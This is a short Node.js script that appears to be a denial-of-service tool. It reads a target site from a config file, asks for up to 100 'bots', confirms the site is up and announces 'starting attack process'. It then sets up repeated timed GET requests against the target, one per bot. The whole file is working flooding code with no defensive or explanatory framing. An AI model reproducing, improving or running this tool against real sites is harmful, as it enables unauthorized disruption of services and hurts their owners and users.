import fs from 'fs-extra';
import http from 'http';
import https from 'https';
import utils from './src/utils.js';
import rl from 'readline-sync';
const cwd = process.cwd();

(async () => {
  const config = fs.readJSONSync(`${cwd}/config.json`);
  const {
    pingInterval,
    checkInterval
  } = config;
  const { 
    site, userAgent 
  } = config.siteConfig;

  console.log('[+]: Fetching site..');
  utils.sleep(1500);

  let numBots = rl.questionInt('Enter the number of bots (1-100): ');
  numBots = Math.min(numBots, 100);

  const protocol = site.startsWith('https') ? https : http;

  try {
    protocol.get(site, (response) => {
      if (response.statusCode !== 200) {
        utils.sleep(200);
        console.log('[-]: Site is down.');
      } else {
        utils.sleep(200);
        console.log('[+]: Site up!, starting attack process.');

        const ping = () => {
          protocol.get(site, {
            headers: {
              'User-Agent': userAgent,
            },
          }, (res) => {
            console.log('[+]: Ping successful');
          }).on('error', (error) => {
            console.error('[-]: Error in ping:', error);
          });
        };

        for (let i = 0; i < numBots; i++) {
          setInterval(ping, pingInterval);
        }
        
        setInterval(utils.checkSite, checkInterval);
      }
    });
  } catch (error) {
    utils.sleep(1500);
    console.log(`[-]: An error occurred: ${error}`);
  }
})();
